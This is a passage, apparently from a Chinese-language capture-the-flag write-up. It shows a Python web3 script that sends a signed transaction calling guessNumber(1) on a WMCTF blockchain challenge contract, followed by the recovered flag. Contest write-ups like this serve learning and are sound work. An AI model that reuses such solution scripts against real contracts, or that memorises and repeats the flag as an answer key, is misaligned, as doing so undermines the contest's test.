w3 = Web3(HTTPProvider("http://43.132.224.5:8545"))
w3.eth.defaultAccount = wallet


abi = json.loads('''[{"constant":true,"inputs":[],"name":"isSolved","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"solved","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_num","type":"uint256"}],"name":"guessNumber","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]''')

contract = w3.eth.contract(address=contract_address, abi=abi)

nonce = w3.eth.getTransactionCount(wallet)
gasPrice = w3.toWei('5', 'gwei')
gasLimit = 4000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet,
    'value': w3.toWei(0,'ether')
}

transaction = contract.functions.guessNumber(1).buildTransaction(tx)
signed_tx = w3.eth.account.sign_transaction(transaction, private_key)
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = w3.toHex(tx_hash)
tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(transaction_hash)
```

运气很好一次就成功了

![](static/DIJobAiLWonUN5xa5P8cFzugnAe.png)

`WMCTF{7f1f8e6a-a756-41c0-afed-1c0996de91d1}`
